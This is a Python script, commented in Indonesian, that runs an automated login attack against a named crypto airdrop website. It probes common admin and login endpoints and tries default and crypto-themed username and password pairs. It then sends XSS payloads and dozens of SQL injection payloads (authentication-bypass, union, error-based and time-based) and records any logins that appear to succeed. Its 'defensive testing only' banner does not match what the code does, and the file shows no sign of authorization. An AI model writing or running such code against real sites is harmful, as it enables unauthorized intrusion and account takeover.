#!/usr/bin/env python3
"""
Simple Login Tester untuk 0G Foundation Airdrop
Mencoba login langsung ke endpoint login yang ditemukan
HANYA UNTUK TUJUAN PENGETESAN KEAMANAN DEFENSIF
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests

class SimpleLoginTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.successful_logins = []
        self.tested_combinations = 0

    async def execute_login_test(self):
        """Eksekusi test login sederhana"""
        print("🔓 Simple Login Tester")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        try:
            # Fase 1: Test endpoint login yang umum
            await self.test_common_login_endpoints()

            # Fase 2: Test dengan payloads khusus
            await self.test_special_payloads()

            # Fase 3: Test dengan SQL injection
            await self.test_sql_injection()

            # Fase 4: Generate report
            await self.generate_login_report()

            if self.successful_logins:
                print("✅ Login test successful!")
                print(f"📊 Successful logins: {len(self.successful_logins)}")
                for login in self.successful_logins:
                    print(f"🔑 {login['endpoint']}: {login.get('username', 'N/A')}:{login.get('password', 'N/A')}")
            else:
                print("❌ No successful logins found")

        except Exception as e:
            print(f"❌ Error during login test: {str(e)}")

    async def test_common_login_endpoints(self):
        """Test endpoint login yang umum"""
        print("\n🕵️ Phase 1: Testing Common Login Endpoints")
        print("-" * 50)

        # Endpoint login yang akan diuji
        login_endpoints = [
            "/login", "/admin", "/dashboard", "/api/login", "/auth/login",
            "/signin", "/sign-in", "/authenticate", "/verify", "/oauth",
            "/auth", "/user", "/profile", "/account", "/settings",
            "/api/auth", "/api/user", "/api/session", "/api/token",
            "/wp-admin", "/phpmyadmin", "/admin/login", "/cpanel"
        ]

        # Kombinasi credentials dasar
        basic_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("admin", "password123"),
            ("admin", "12345678"),
            ("admin", "qwerty"),
            ("admin", "letmein"),
            ("administrator", "administrator"),
            ("administrator", "admin"),
            ("administrator", "password"),
            ("root", "root"),
            ("root", "password"),
            ("root", "admin"),
            ("user", "user"),
            ("user", "password"),
            ("test", "test"),
            ("test", "password"),
            ("demo", "demo"),
            ("demo", "password"),
            ("guest", "guest"),
            ("guest", "password"),
        ]

        # Test pada setiap endpoint
        for endpoint in login_endpoints:
            try:
                print(f"🔍 Testing endpoint: {endpoint}")

                # Test dengan GET request dulu
                try:
                    get_response = self.session.get(urljoin(self.target_url, endpoint), timeout=10)
                    if get_response.status_code == 200:
                        print(f"✅ GET {endpoint} - Status: {get_response.status_code}")
                        # Cari form dalam response
                        forms = self.find_forms_in_response(get_response.text)
                        if forms:
                            print(f"📋 Found {len(forms)} forms in GET response")
                            await self.test_forms_with_credentials(endpoint, forms, basic_credentials)
                except Exception as e:
                    print(f"❌ GET {endpoint} failed: {str(e)}")

                # Test dengan POST request menggunakan dasar payload
                await self.test_direct_post(endpoint, basic_credentials)

            except Exception as e:
                print(f"❌ Error testing {endpoint}: {str(e)}")
                continue

    def find_forms_in_response(self, content: str) -> List[Dict]:
        """Cari forms dalam HTML response"""
        forms = []

        # Pattern untuk form
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)

        for form_html in form_matches[:3]:  # Batasi ke 3 forms pertama
            form_data = {
                "action": self.extract_form_attribute(form_html, "action"),
                "method": self.extract_form_attribute(form_html, "method", "GET"),
                "inputs": self.extract_form_inputs(form_html)
            }
            forms.append(form_data)

        return forms

    def extract_form_attribute(self, form_html: str, attr: str, default: str = "") -> str:
        """Extract attribute dari form"""
        pattern = f'{attr}=[\'"]([^\'"]*)[\'"]'
        match = re.search(pattern, form_html, re.IGNORECASE)
        return match.group(1) if match else default

    def extract_form_inputs(self, form_html: str) -> List[Dict]:
        """Extract input fields dari form"""
        inputs = []

        # Pattern untuk input
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)

        for input_html in input_matches:
            input_data = {
                "name": self.extract_form_attribute(input_html, "name"),
                "type": self.extract_form_attribute(input_html, "type", "text"),
                "value": self.extract_form_attribute(input_html, "value", "")
            }
            if input_data["name"]:
                inputs.append(input_data)

        return inputs

    async def test_forms_with_credentials(self, endpoint: str, forms: List[Dict], credentials: List[Tuple]):
        """Test forms dengan credentials"""
        for form in forms:
            try:
                # Cari field username dan password
                username_field = None
                password_field = None

                for input_field in form["inputs"]:
                    field_name = input_field["name"].lower()
                    if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                        username_field = input_field["name"]
                    elif "pass" in field_name:
                        password_field = input_field["name"]

                if username_field and password_field:
                    print(f"🔍 Found form with {username_field} and {password_field}")

                    # Test beberapa credentials pertama
                    for i, (username, password) in enumerate(credentials[:5]):
                        try:
                            form_data = {
                                username_field: username,
                                password_field: password
                            }

                            # Tambahkan hidden fields
                            for input_field in form["inputs"]:
                                if input_field["type"] == "hidden" and input_field["name"] not in form_data:
                                    form_data[input_field["name"]] = input_field["value"]

                            # Build URL
                            action = form["action"] or endpoint
                            if action.startswith("/"):
                                url = urljoin(self.target_url, action)
                            else:
                                url = urljoin(self.target_url, action)

                            # Make POST request
                            response = self.session.post(url, data=form_data, timeout=10)

                            self.tested_combinations += 1
                            await self.check_login_response(response, username, password, endpoint, "form_post")

                        except Exception as e:
                            continue

            except Exception as e:
                continue

    async def test_direct_post(self, endpoint: str, credentials: List[Tuple]):
        """Test POST request langsung tanpa form analysis"""
        # Test dengan payload sederhana
        test_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"user": "admin", "pass": "admin"},
            {"user": "admin", "password": "admin"},
            {"login": "admin", "password": "admin"},
            {"email": "admin", "password": "admin"},
            {"name": "admin", "password": "admin"},
            {"username": "administrator", "password": "administrator"},
            {"login": "administrator", "password": "administrator"},
        ]

        # Test payload umum
        for payload in test_payloads:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.post(url, data=payload, timeout=10)

                self.tested_combinations += 1
                await self.check_login_response(response, payload.get("username"), payload.get("password"), endpoint, "direct_post")

            except Exception as e:
                continue

        # Test dengan beberapa dari credentials
        for i, (username, password) in enumerate(credentials[:10]):
            try:
                payload = {"username": username, "password": password}
                url = urljoin(self.target_url, endpoint)
                response = self.session.post(url, data=payload, timeout=10)

                self.tested_combinations += 1
                await self.check_login_response(response, username, password, endpoint, "direct_post")

            except Exception:
                continue

    async def test_special_payloads(self):
        """Test dengan payloads khusus"""
        print("\n🔓 Phase 2: Testing Special Payloads")
        print("-" * 50)

        # Payload khusus untuk mencoba menembus sistem
        special_payloads = [
            # Empty payloads
            {"username": "", "password": ""},
            {"username": "admin", "password": ""},
            {"username": "", "password": "admin"},

            # Long payloads
            {"username": "admin" * 100, "password": "admin" * 100},

            # Special characters
            {"username": "admin<script>alert('XSS')</script>", "password": "admin"},
            {"username": "admin' --", "password": "admin"},
            {"username": "admin' #", "password": "admin"},
            {"username": "admin' OR '1'='1", "password": "admin"},
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},

            # SQL injection variants
            {"username": "admin' OR 1=1--", "password": "admin"},
            {"username": "admin' OR 'a'='a", "password": "admin"},
            {"username": "admin' OR 1=1#", "password": "admin"},
            {"username": "admin' OR 1=1/*", "password": "admin"},

            # XSS variants
            {"username": "<script>alert('XSS')</script>", "password": "admin"},
            {"username": "javascript:alert('XSS')", "password": "admin"},
            {"username": "<img src=x onerror=alert('XSS')>", "password": "admin"},
            {"username": "<svg onload=alert('XSS')>", "password": "admin"},

            # JWT token variants
            {"username": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "password": "admin"},
            {"username": "admin", "password": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},

            # Email-based attacks
            {"username": "admin@0gfoundation.ai", "password": "admin"},
            {"username": "admin@airdrop.0gfoundation.ai", "password": "admin"},
            {"username": "0x742d35Cc6634C0532925a3b8D6B5C5D2b", "password": "admin"},

            # Crypto-related credentials
            {"username": "0g", "password": "0g"},
            {"username": "foundation", "password": "foundation"},
            {"username": "airdrop", "password": "airdrop"},
            {"username": "crypto", "password": "crypto"},
            {"username": "blockchain", "password": "blockchain"},
            {"username": "bitcoin", "password": "bitcoin"},
            {"username": "ethereum", "password": "ethereum"},
            {"username": "wallet", "password": "wallet"},
            {"username": "web3", "password": "web3"},
            {"username": "defi", "password": "defi"},
        ]

        endpoints = ["/login", "/auth/login", "/api/login", "/authenticate", "/signin"]

        for payload in special_payloads:
            for endpoint in endpoints:
                try:
                    url = urljoin(self.target_url, endpoint)
                    response = self.session.post(url, data=payload, timeout=10)

                    self.tested_combinations += 1
                    await self.check_login_response(response, payload.get("username"), payload.get("password"), endpoint, "special_payload")

                except Exception:
                    continue

    async def test_sql_injection(self):
        """Test SQL injection yang lebih intensif"""
        print("\n🔓 Phase 3: Advanced SQL Injection Testing")
        print("-" * 50)

        # SQL injection payloads yang lebih advanced
        sql_payloads = [
            # Union-based injection
            {"username": "' OR '1'='1' --", "password": "password"},
            {"username": "' OR 1=1 --", "password": "password"},
            {"username": "' OR 'a'='a' --", "password": "password"},
            {"username": "' OR 1=1#", "password": "password"},
            {"username": "' OR 1=1/*", "password": "password"},

            # Boolean-based injection
            {"username": "' AND 1=1 --", "password": "password"},
            {"username": "' AND 1=0 --", "password": "password"},
            {"username": "' AND 'a'='a' --", "password": "password"},
            {"username": "' AND 1=1#", "password": "password"},

            # Error-based injection
            {"username": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --", "password": "password"},
            {"username": "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) --", "password": "password"},
            {"username": "' AND 1=(SELECT COUNT(*) FROM users) --", "password": "password"},
            {"username": "' AND 1=(SELECT COUNT(*) FROM admin) --", "password": "password"},

            # Time-based injection
            {"username": "' AND SLEEP(5) --", "password": "password"},
            {"username": "' AND BENCHMARK(5000000, SHA1('test')) --", "password": "password"},
            {"username": "' AND WAITFOR DELAY '0:0:5' --", "password": "password"},

            # Advanced bypass techniques
            {"username": "' OR (SELECT COUNT(*) FROM users) > 0 --", "password": "password"},
            {"username": "' OR (SELECT COUNT(*) FROM admin) > 0 --", "password": "password"},
            {"username": "' UNION SELECT NULL, NULL, NULL --", "password": "password"},
            {"username": "' UNION SELECT 1,2,3 --", "password": "password"},
            {"username": "' UNION SELECT username, password, NULL FROM users --", "password": "password"},

            # MySQL specific
            {"username": "' OR (SELECT IF(1=1, SLEEP(5), 0)) --", "password": "password"},
            {"username": "' OR (SELECT IF(SUBSTRING(current_user,1,1)='a', SLEEP(5), 0)) --", "password": "password"},

            # PostgreSQL specific
            {"username": "' OR (SELECT pg_sleep(5)) --", "password": "password"},
            {"username": "' OR (SELECT version()) > 0 --", "password": "password"},

            # SQL Server specific
            {"username": "' OR 1=(SELECT @@version) --", "password": "password"},
            {"username": "' OR 1=(SELECT COUNT(*) FROM sysobjects) --", "password": "password"},

            # Alternative syntax
            {"username": "'/**/OR/**/'1'='1'/**/--", "password": "password"},
            {"username": "'%20OR%201%3D1", "password": "password"},
            {"username": "'/*comment*/OR/*comment*/1=1/*comment*/--", "password": "password"},
        ]

        endpoints = ["/login", "/auth/login", "/api/login", "/authenticate", "/signin"]

        for payload in sql_payloads:
            for endpoint in endpoints:
                try:
                    url = urljoin(self.target_url, endpoint)
                    response = self.session.post(url, data=payload, timeout=15)  # Timeout lebih lama untuk time-based

                    self.tested_combinations += 1
                    await self.check_login_response(response, payload.get("username"), payload.get("password"), endpoint, "sql_injection")

                except Exception:
                    continue

    async def check_login_response(self, response, username: str, password: str, endpoint: str, method: str):
        """Check response dari login attempt"""
        # Status code yang menarik
        if response.status_code not in [200, 302, 303, 307, 401, 403]:
            return

        # Check untuk error yang mungkin menunjukkan berhasil (misalnya database error)
        if response.status_code == 500:
            content = response.text.lower()
            if any(error in content for error in ['mysql_fetch', 'mysql_num', 'syntax error', 'ora-00933', 'unclosed quotation']):
                print(f"🚨 SQL ERROR INJECTION: {endpoint} with {username[:20]}... via {method}")
                self.successful_logins.append({
                    "endpoint": endpoint,
                    "username": username,
                    "password": password,
                    "method": method,
                    "status_code": response.status_code,
                    "attack_type": "sql_error_injection",
                    "timestamp": datetime.now().isoformat()
                })
                return

        content = response.text.lower()

        # Login success indicators
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'account', 'settings',
            'admin panel', 'administrator', 'logged in', 'authenticated',
            'success', 'welcome back', 'my account', 'user profile',
            'dashboard', 'control panel', 'management', 'console',
            'dashboard', 'home', 'main', 'overview'
        ]

        # Login failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'wrong', 'error', 'failed',
            'unauthorized', 'access denied', 'not authorized',
            'invalid credentials', 'authentication failed',
            'login failed', 'sign in failed', 'access denied',
            'try again', 'incorrect password', 'invalid username'
        ]

        # Redirect indicators (might indicate successful login)
        if response.status_code in [302, 303, 307, 308]:
            location = response.headers.get('location', '')
            location_lower = location.lower()
            if any(keyword in location_lower for keyword in ['dashboard', 'admin', 'profile', 'account', 'home']):
                print(f"🚨 REDIRECT SUCCESS: {endpoint} with {username} via {method} -> {location}")
                self.successful_logins.append({
                    "endpoint": endpoint,
                    "username": username,
                    "password": password,
                    "method": method,
                    "status_code": response.status_code,
                    "redirect_location": location,
                    "attack_type": "redirect_success",
                    "timestamp": datetime.now().isoformat()
                })
                return

        # Check content for success indicators
        has_success = any(indicator in content for indicator in success_indicators)
        has_failure = any(indicator in content for indicator in failure_indicators)

        if has_success and not has_failure:
            print(f"🚨 LOGIN SUCCESS: {endpoint} with {username} via {method}")
            self.successful_logins.append({
                "endpoint": endpoint,
                "username": username,
                "password": password,
                "method": method,
                "status_code": response.status_code,
                "attack_type": "success",
                "timestamp": datetime.now().isoformat()
            })
        elif has_success and has_failure:
            # Mixed indicators - could be partial success
            print(f"🚨 MIXED RESPONSE: {endpoint} with {username} via {method}")
        elif response.status_code == 200 and not has_failure:
            # No failure indicators, could be successful
            print(f"🚨 POTENTIAL SUCCESS: {endpoint} with {username} via {method}")
            self.successful_logins.append({
                "endpoint": endpoint,
                "username": username,
                "password": password,
                "method": method,
                "status_code": response.status_code,
                "attack_type": "potential_success",
                "timestamp": datetime.now().isoformat()
            })

    async def generate_login_report(self):
        """Generate login test report"""
        print("\n📋 Generating Login Test Report")

        report = {
            "scan_info": {
                "target_url": self.target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Simple Login Testing",
                "scan_duration": "30-60 detik",
                "combinations_tested": self.tested_combinations
            },
            "summary": {
                "successful_logins": len(self.successful_logins),
                "combinations_tested": self.tested_combinations,
                "login_methods_success": {},
                "attack_types_success": {}
            },
            "successful_logins": self.successful_logins,
            "recommendations": [
                "Implement strong authentication mechanisms",
                "Use parameterized queries to prevent SQL injection",
                "Implement proper input validation",
                "Use secure session management",
                "Implement rate limiting to prevent brute force attacks",
                "Use multi-factor authentication",
                "Implement proper error handling",
                "Use Web Application Firewall (WAF)",
                "Regular security audits and penetration testing",
                "Implement proper redirect validation"
            ]
        }

        # Analyze successful login methods
        for login in self.successful_logins:
            method = login.get("method", "unknown")
            attack_type = login.get("attack_type", "unknown")

            if method not in report["summary"]["login_methods_success"]:
                report["summary"]["login_methods_success"][method] = 0
            report["summary"]["login_methods_success"][method] += 1

            if attack_type not in report["summary"]["attack_types_success"]:
                report["summary"]["attack_types_success"][attack_type] = 0
            report["summary"]["attack_types_success"][attack_type] += 1

        # Save detailed report
        filename = f"simple_login_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"📊 Detailed report saved to: {filename}")

async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("🔓 Simple Login Tester")
    print("=" * 70)
    print(f"🎯 Target: {target_url}")
    print("=" * 70)
    print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
    print("=" * 70)

    tester = SimpleLoginTester(target_url)
    await tester.execute_login_test()

if __name__ == "__main__":
    asyncio.run(main())